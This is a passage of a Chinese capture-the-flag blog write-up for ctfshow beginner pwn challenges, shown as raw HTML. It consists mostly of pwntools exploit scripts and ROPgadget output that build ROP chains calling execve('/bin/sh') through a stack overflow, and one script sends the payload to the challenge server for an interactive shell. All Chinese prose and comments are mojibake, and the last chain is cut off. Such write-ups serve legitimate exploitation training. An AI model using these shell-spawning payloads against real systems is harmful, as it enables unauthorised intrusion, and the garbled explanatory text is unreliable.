</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x50</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># -------------------------- ç¬¬ä¸€é˜¶æ®µï¼šread(0, bss, 0x10) ï¼ˆçº¯å•ä¸ª gadget ä¼ å‚ï¼‰--------------------------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç³»ç»Ÿè°ƒç”¨è¦æ±‚ï¼šrax=0ï¼ˆreadï¼‰ã€rdi=0ï¼ˆstdinï¼‰ã€rsi=bssï¼ˆç¼“å†²åŒºï¼‰ã€rdx=0x10ï¼ˆé•¿åº¦ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># é€ä¸ª gadget ä¼ å‚ï¼Œé¡ºåºä»»æ„ï¼ˆæ¨èæŒ‰ rax â†’ rdx â†’ rsi â†’ rdi é¡ºåºï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>  <span class="c1"># å•ä¸ª gadgetï¼šç»™ rax ä¼  0ï¼ˆread ç³»ç»Ÿè°ƒç”¨å·ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="c1"># å•ä¸ª gadgetï¼šç»™ rdx ä¼  0x10ï¼ˆè¯»å–é•¿åº¦ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>  <span class="c1"># å•ä¸ª gadgetï¼šç»™ rsi ä¼  bssï¼ˆå†™å…¥åœ°å€ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç‰¹æ®Šå¤„ç†åŒ pop gadgetï¼šç»™ rdi ä¼  0ï¼Œè¡¥ä¸€ä¸ªå ä½å‚æ•°ç»™ rbpï¼ˆ0xdeadbeef ä»»æ„æ— æ•ˆåœ°å€ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>                     <span class="c1"># å•ä¸ª gadgetï¼šæ ˆå¯¹é½ï¼ˆsyscall å‰éœ€ 16 å­—èŠ‚å¯¹é½ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>                 <span class="c1"># å•ä¸ª gadgetï¼šè§¦å‘ read ç³»ç»Ÿè°ƒç”¨ï¼ˆå…³é”®ï¼ï¼‰</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># -------------------------- ç¬¬äºŒé˜¶æ®µï¼šexecve(bss, NULL, NULL) ï¼ˆçº¯å•ä¸ª gadget ä¼ å‚ï¼‰--------------------------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç³»ç»Ÿè°ƒç”¨è¦æ±‚ï¼šrax=59ï¼ˆexecveï¼‰ã€rdi=bssï¼ˆ/bin/shï¼‰ã€rsi=0ã€rdx=0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># é€ä¸ª gadget ä¼ å‚ï¼Œé€»è¾‘å’Œä¸Šé¢ä¸€è‡´</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span> <span class="c1"># å•ä¸ª gadgetï¼šç»™ rax ä¼  59ï¼ˆexecve ç³»ç»Ÿè°ƒç”¨å·ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>    <span class="c1"># å•ä¸ª gadgetï¼šç»™ rdx ä¼  0ï¼ˆç¯å¢ƒå˜é‡ NULLï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>    <span class="c1"># å•ä¸ª gadgetï¼šç»™ rsi ä¼  0ï¼ˆå‚æ•°åˆ—è¡¨ NULLï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç‰¹æ®Šå¤„ç†åŒ pop gadgetï¼šç»™ rdi ä¼  bssï¼Œè¡¥å ä½å‚æ•°</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>                     <span class="c1"># å•ä¸ª gadgetï¼šæ ˆå¯¹é½</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>                 <span class="c1"># å•ä¸ª gadgetï¼šè§¦å‘ execve ç³»ç»Ÿè°ƒç”¨ï¼ˆå…³é”®ï¼ï¼‰</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸32ä½ä¸åŒï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ul>
<li>å­˜å‚¨å‚æ•°çš„å¯„å­˜å™¨åä¸åŒï¼›</li>
<li>retè¿”å›çš„å‡½æ•°åä¸åŒï¼›</li>
<li>32ä½ä¸ºint 0x80ï¼Œ64ä½ä¸ºsyscall ret.</li>
</ul>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#34;./pwn&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28113</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="mh">0x46b9f8</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4016c3</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_rsi</span> <span class="o">=</span> <span class="mh">0x4377f9</span>
</span></span><span class="line"><span class="cl"><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x6c1000</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x45bac5</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x50</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_073">PWN_073
</h3><p>é¢˜ç›®ï¼šæ„‰å¿«çš„å°è¯•ä¸€ä¸‹ä¸€æŠŠæ¢­å§ï¼</p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/256.png"
	width="740"
	height="195"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/256_hu_3275742cbac66bb4.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/256_hu_22389705e6ff8589.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="379"
		data-flex-basis="910px"
	
></p>
<p>çœ‹å‡ºæ¥æ˜¯é™æ€ç¼–è¯‘äº†ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/257.png"
	width="991"
	height="479"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/257_hu_261a8f8dceaa8e19.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/257_hu_283078c59db171fe.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="496px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258.png"
	width="1840"
	height="81"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258_hu_c3bef381c605e654.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/258_hu_7af9f22cc3ac88ae.png 1024w"
	loading="lazy"
	
		alt="é™æ€ç¼–è¯‘"
	
	
		class="gallery-image" 
		data-flex-grow="2271"
		data-flex-basis="5451px"
	
></p>
<p>IDAåˆ†æmainå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/259.png"
	width="705"
	height="210"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/259_hu_ee8d103a764557f5.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/259_hu_c5e2952197f3a5ff.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="335"
		data-flex-basis="805px"
	
></p>
<p>è¿˜æ˜¯æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯ç”±äºæ˜¯é™æ€ç¼–è¯‘ï¼Œæˆ‘ä»¬æ— æ³•å†ä½¿ç”¨ret2libcæ¥è¿›è¡Œgetshellï¼Œç¨‹åºä¸­ä¹Ÿæ²¡æœ‰systemå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç›´æ¥ä½¿ç”¨ROPgadgetæ¥å¸®åŠ©æˆ‘ä»¬æ„é€ ä¸€ä¸ªROPé“¾ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary pwn --ropchain
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ROP</span> <span class="n">chain</span> <span class="n">generation</span>
</span></span><span class="line"><span class="cl"><span class="o">===========================================================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">Step</span> <span class="mi">1</span> <span class="o">--</span> <span class="n">Write</span><span class="o">-</span><span class="n">what</span><span class="o">-</span><span class="n">where</span> <span class="n">gadgets</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x8051035</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esi</span><span class="p">],</span> <span class="n">edi</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">esi</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">edi</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x8048433</span> <span class="n">pop</span> <span class="n">esi</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x8048480</span> <span class="n">pop</span> <span class="n">edi</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Can</span><span class="s1">&#39;t find the &#39;</span><span class="n">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span><span class="s1">&#39; gadget. Try with another &#39;</span><span class="n">mov</span> <span class="p">[</span><span class="n">r</span><span class="p">],</span> <span class="sa">r</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x80549db</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">edx</span><span class="p">],</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x806f02a</span> <span class="n">pop</span> <span class="n">edx</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x80b81c6</span> <span class="n">pop</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x8049303</span> <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">Step</span> <span class="mi">2</span> <span class="o">--</span> <span class="n">Init</span> <span class="n">syscall</span> <span class="n">number</span> <span class="n">gadgets</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x8049303</span> <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x807a86f</span> <span class="n">inc</span> <span class="n">eax</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">Step</span> <span class="mi">3</span> <span class="o">--</span> <span class="n">Init</span> <span class="n">syscall</span> <span class="n">arguments</span> <span class="n">gadgets</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x80481c9</span> <span class="n">pop</span> <span class="n">ebx</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x80de955</span> <span class="n">pop</span> <span class="n">ecx</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x806f02a</span> <span class="n">pop</span> <span class="n">edx</span> <span class="p">;</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">Step</span> <span class="mi">4</span> <span class="o">--</span> <span class="n">Syscall</span> <span class="n">gadget</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Gadget</span> <span class="n">found</span><span class="p">:</span> <span class="mh">0x806cc25</span> <span class="nb">int</span> <span class="mh">0x80</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="n">Step</span> <span class="mi">5</span> <span class="o">--</span> <span class="n">Build</span> <span class="n">the</span> <span class="n">ROP</span> <span class="n">chain</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">#!/usr/bin/env python2</span>
</span></span><span class="line"><span class="cl">	<span class="c1"># execve generated by ROPgadget</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1"># Padding goes here</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0806f02a</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea060</span><span class="p">)</span> <span class="c1"># @ .data</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080b81c6</span><span class="p">)</span> <span class="c1"># pop eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="s1">&#39;/bin&#39;</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080549db</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0806f02a</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea064</span><span class="p">)</span> <span class="c1"># @ .data + 4</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080b81c6</span><span class="p">)</span> <span class="c1"># pop eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="s1">&#39;//sh&#39;</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080549db</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0806f02a</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x08049303</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080549db</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080481c9</span><span class="p">)</span> <span class="c1"># pop ebx ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea060</span><span class="p">)</span> <span class="c1"># @ .data</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080de955</span><span class="p">)</span> <span class="c1"># pop ecx ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0806f02a</span><span class="p">)</span> <span class="c1"># pop edx ; ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080ea068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x08049303</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret</span>
